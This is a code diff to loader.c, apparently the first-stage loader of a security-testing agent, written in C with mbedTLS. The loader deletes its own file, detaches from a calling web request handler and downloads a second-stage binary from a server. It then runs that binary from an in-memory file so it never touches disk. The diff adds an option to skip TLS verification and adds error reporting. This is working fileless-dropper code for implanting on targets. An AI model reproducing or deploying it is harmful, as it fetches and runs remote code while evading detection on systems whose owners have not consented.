@@ -18,13 +18,19 @@
  /*
   * loader.c – Stage 1 OAST agent loader (C/musl/mbedTLS)
   *
-  * Usage: loader <server-url> <token> <agent-id>
+  * Usage: loader [-k] [-f] <server-url> <token> <agent-id>
   *
-  * Daemonizes immediately (double-fork + setsid) so the parent process
-  * (e.g. a web request handler) returns right away.  The daemon child
-  * downloads Stage 2 agent from <server-url>/dl/second-stage/linux-ARCH,
-  * loads it into an anonymous in-memory file (memfd_create + MFD_CLOEXEC),
-  * and exec(2)s from /proc/self/fd/N — Stage 2 never touches disk.
+  *   -k  Skip TLS certificate verification (use when target lacks CA certs).
+  *   -f  Stay in foreground (don't daemonize); useful for debugging.
+  *
+  * Runs pre-flight checks (URL format, CA bundle) before daemonizing so
+  * errors are printed while stderr is still connected.
+  *
+  * Daemonizes (double-fork + setsid) so the parent process (e.g. a web
+  * request handler) returns right away.  The daemon child downloads
+  * Stage 2 agent from <server-url>/dl/second-stage/linux-ARCH, loads it
+  * into an anonymous in-memory file (memfd_create + MFD_CLOEXEC), and
+  * exec(2)s from /proc/self/fd/N — Stage 2 never touches disk.
   * Self-deletes (unlink argv[0]) immediately on startup (one-shot).
   *
   * Build: see Dockerfile / Dockerfile.arm64 for the canonical Docker build
@@ -80,21 +86,21 @@ static void die(const char* msg) {
     _exit(1);
 }
 
+/* CA bundle paths checked by load_ca() and the pre-flight. */
+static const char* ca_files[] = {
+    "/etc/ssl/certs/ca-certificates.crt",   /* Debian/Ubuntu/Alpine */
+    "/etc/pki/tls/certs/ca-bundle.crt",     /* RHEL/CentOS/Fedora */
+    "/etc/ssl/ca-bundle.pem",               /* OpenSUSE */
+    "/etc/ssl/cert.pem",                    /* macOS/FreeBSD */
+    NULL,
+};
+
 /* Try CA bundle paths in order; return 0 on first success. */
 static int load_ca(mbedtls_x509_crt* ca) {
-    static const char* files[] = {
-        "/etc/ssl/certs/ca-certificates.crt",   /* Debian/Ubuntu/Alpine */
-        "/etc/pki/tls/certs/ca-bundle.crt",     /* RHEL/CentOS/Fedora */
-        "/etc/ssl/ca-bundle.pem",               /* OpenSUSE */
-        "/etc/ssl/cert.pem",                    /* macOS/FreeBSD */
-        NULL,
-    };
-    for (int i = 0; files[i]; i++) {
-        /* mbedtls_x509_crt_parse_file returns 0 (all ok), >0 (partial), <0 (failure) */
-        if (mbedtls_x509_crt_parse_file(ca, files[i]) >= 0)
+    for (int i = 0; ca_files[i]; i++) {
+        if (mbedtls_x509_crt_parse_file(ca, ca_files[i]) >= 0)
             return 0;
     }
-    /* Fall back to directory scan */
     if (mbedtls_x509_crt_parse_path(ca, "/etc/ssl/certs/") >= 0)
         return 0;
     return -1;
@@ -104,19 +110,41 @@ int main(int argc, char* argv[]) {
     /* Self-delete immediately — the loader is one-shot */
     unlink(argv[0]);
 
-    if (argc != 4)
-        die("usage: loader <url> <token> <agent_id>");
+    /* ---- Parse optional flags before positional args ---- */
+    int insecure = 0, foreground = 0;
+    int argi = 1;
+    while (argi < argc && argv[argi][0] == '-') {
+        if (strcmp(argv[argi], "-k") == 0)      insecure = 1;
+        else if (strcmp(argv[argi], "-f") == 0)  foreground = 1;
+        else die("unknown flag (expected -k or -f)");
+        argi++;
+    }
+    if (argc - argi != 3)
+        die("usage: loader [-k] [-f] <url> <token> <agent_id>");
 
-    const char* server_url = argv[1];
-    const char* token = argv[2];
-    const char* agent_id = argv[3];
+    const char* server_url = argv[argi];
+    const char* token = argv[argi + 1];
+    const char* agent_id = argv[argi + 2];
+
+    /* ---- Pre-flight checks (stderr is still connected) ---- */
+    if (strncmp(server_url, "https://", 8) != 0)
+        die("server URL must start with https://");
+
+    if (!insecure) {
+        int found = 0;
+        for (int i = 0; ca_files[i]; i++) {
+            if (access(ca_files[i], R_OK) == 0) { found = 1; break; }
+        }
+        if (!found)
+            die("no CA bundle found (install ca-certificates or use -k to skip TLS verification)");
+    }
 
     /* ---- Daemonize (double-fork + setsid) ----
      * The parent returns immediately so a short-lived caller (e.g. a web
      * request handler) is released.  The daemon grandchild does the real
-     * work: download Stage 2, memfd, exec.
+     * work: download Stage 2, memfd, exec.  Skipped with -f.
      */
-    {
+    if (!foreground) {
         pid_t pid = fork();
         if (pid < 0) _exit(1);
         if (pid > 0) _exit(0);          /* parent exits */
@@ -133,20 +161,14 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    /* ---- After daemonization stderr is /dev/null; use bare _exit(1)
-     *      instead of die() to avoid embedding dead string literals. ---- */
-
     /* ---- Build download URL ---- */
     char dl_url[2048];
     int n = snprintf(dl_url, sizeof(dl_url),
         "%s/dl/second-stage/linux-" ARCH, server_url);
     if (n < 0 || n >= (int)sizeof(dl_url))
-        _exit(1);
+        die("URL too long");
 
     /* ---- Parse https://host[:port]/path ---- */
-    if (strncmp(dl_url, "https://", 8) != 0)
-        _exit(1);
-
     char* rest = dl_url + 8;
     char* slash = strchr(rest, '/');
     char* path = slash ? slash : "/";
@@ -154,12 +176,12 @@ int main(int argc, char* argv[]) {
     char hostport[256];
     if (slash) {
         size_t hp_len = (size_t)(slash - rest);
-        if (hp_len >= sizeof(hostport)) _exit(1);
+        if (hp_len >= sizeof(hostport)) die("host too long");
         memcpy(hostport, rest, hp_len);
         hostport[hp_len] = '\0';
     } else {
         size_t hp_len = strlen(rest);
-        if (hp_len >= sizeof(hostport)) _exit(1);
+        if (hp_len >= sizeof(hostport)) die("host too long");
         memcpy(hostport, rest, hp_len);
         hostport[hp_len] = '\0';
     }
@@ -188,7 +210,7 @@ int main(int argc, char* argv[]) {
         "\r\n",
         path, hostport, token);
     if (n < 0 || n >= (int)sizeof(request))
-        _exit(1);
+        die("request too large");
 
     /* ---- mbedTLS setup ---- */
     mbedtls_net_context      net;
@@ -208,28 +230,34 @@ int main(int argc, char* argv[]) {
 
     ret = mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func,
         &entropy, NULL, 0);
-    if (ret) _exit(1);
+    if (ret) die("rng seed failed");
 
-    if (load_ca(&cacert) != 0) _exit(1);
+    if (!insecure) {
+        if (load_ca(&cacert) != 0) die("no CA bundle found");
+    }
 
     ret = mbedtls_net_connect(&net, hostname, port, MBEDTLS_NET_PROTO_TCP);
-    if (ret) _exit(1);
+    if (ret) die("connect failed");
 
     ret = mbedtls_ssl_config_defaults(&conf,
         MBEDTLS_SSL_IS_CLIENT,
         MBEDTLS_SSL_TRANSPORT_STREAM,
         MBEDTLS_SSL_PRESET_DEFAULT);
-    if (ret) _exit(1);
+    if (ret) die("ssl config failed");
 
-    mbedtls_ssl_conf_authmode(&conf, MBEDTLS_SSL_VERIFY_REQUIRED);
-    mbedtls_ssl_conf_ca_chain(&conf, &cacert, NULL);
+    if (insecure) {
+        mbedtls_ssl_conf_authmode(&conf, MBEDTLS_SSL_VERIFY_NONE);
+    } else {
+        mbedtls_ssl_conf_authmode(&conf, MBEDTLS_SSL_VERIFY_REQUIRED);
+        mbedtls_ssl_conf_ca_chain(&conf, &cacert, NULL);
+    }
     mbedtls_ssl_conf_rng(&conf, mbedtls_ctr_drbg_random, &ctr_drbg);
 
     ret = mbedtls_ssl_setup(&ssl, &conf);
-    if (ret) _exit(1);
+    if (ret) die("ssl setup failed");
 
     ret = mbedtls_ssl_set_hostname(&ssl, hostname);
-    if (ret) _exit(1);
+    if (ret) die("ssl set_hostname failed");
 
     mbedtls_ssl_set_bio(&ssl, &net,
         mbedtls_net_send, mbedtls_net_recv, NULL);
@@ -239,7 +267,7 @@ int main(int argc, char* argv[]) {
         ret = mbedtls_ssl_handshake(&ssl);
     } while (ret == MBEDTLS_ERR_SSL_WANT_READ ||
         ret == MBEDTLS_ERR_SSL_WANT_WRITE);
-    if (ret) _exit(1);
+    if (ret) die("tls handshake failed");
 
     /* Send HTTP request */
     size_t sent = 0, req_len = strlen(request);
@@ -248,7 +276,7 @@ int main(int argc, char* argv[]) {
             (unsigned char*)request + sent,
             req_len - sent);
         if (ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
-        if (ret < 0) _exit(1);
+        if (ret < 0) die("ssl write failed");
         sent += (size_t)ret;
     }
 
@@ -267,29 +295,32 @@ int main(int argc, char* argv[]) {
             break;
         }
     }
-    if (!found) _exit(1);
+    if (!found) die("malformed HTTP response");
 
     /* Check HTTP 200 status */
     hdr[hlen] = '\0';
     char* sp = memchr(hdr, ' ', hlen < 16 ? (size_t)hlen : 16);
     if (!sp || strncmp(sp + 1, "200", 3) != 0)
-        _exit(1);
+        die("download failed: non-200 response");
 
     /* ---- Stream body into anonymous in-memory file ---- */
     int memfd = xmemfd_create("", MFD_CLOEXEC);
-    if (memfd < 0) _exit(1);
+    if (memfd < 0) die("memfd_create failed");
 
     unsigned char body[BODY_BUF];
     for (;;) {
         ret = mbedtls_ssl_read(&ssl, body, sizeof(body));
         if (ret == MBEDTLS_ERR_SSL_WANT_READ) continue;
         if (ret == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY || ret == 0) break;
-        if (ret < 0) _exit(1);
+        if (ret < 0) {
+            close(memfd);
+            die("ssl read failed");
+        }
         unsigned char* p = body;
         int rem = ret;
         while (rem > 0) {
             ssize_t w = write(memfd, p, (size_t)rem);
-            if (w < 0) _exit(1);
+            if (w < 0) { close(memfd); die("write failed"); }
             p += w;
             rem -= (int)w;
         }
@@ -297,17 +328,32 @@ int main(int argc, char* argv[]) {
 
     mbedtls_ssl_close_notify(&ssl);
 
-    /* Exec Stage 2 agent directly from memory */
+    /* Exec Stage 2 agent directly from memory.
+     * Propagate -k to the agent so its WebSocket connection also
+     * skips TLS verification when the target has no CA bundle. */
     char fdpath[32];
     snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", memfd);
 
-    char* exec_argv[] = {
-        fdpath,
-        "-url",   (char*)server_url,
-        "-token", (char*)token,
-        "-id",    (char*)agent_id,
-        NULL
-    };
-    execv(fdpath, exec_argv);
-    _exit(1);
+    if (insecure) {
+        char* exec_argv[] = {
+            fdpath,
+            "-url",   (char*)server_url,
+            "-token", (char*)token,
+            "-id",    (char*)agent_id,
+            "-k",
+            NULL
+        };
+        execv(fdpath, exec_argv);
+    } else {
+        char* exec_argv[] = {
+            fdpath,
+            "-url",   (char*)server_url,
+            "-token", (char*)token,
+            "-id",    (char*)agent_id,
+            NULL
+        };
+        execv(fdpath, exec_argv);
+    }
+    die("execv failed");
+    return 1;
 }
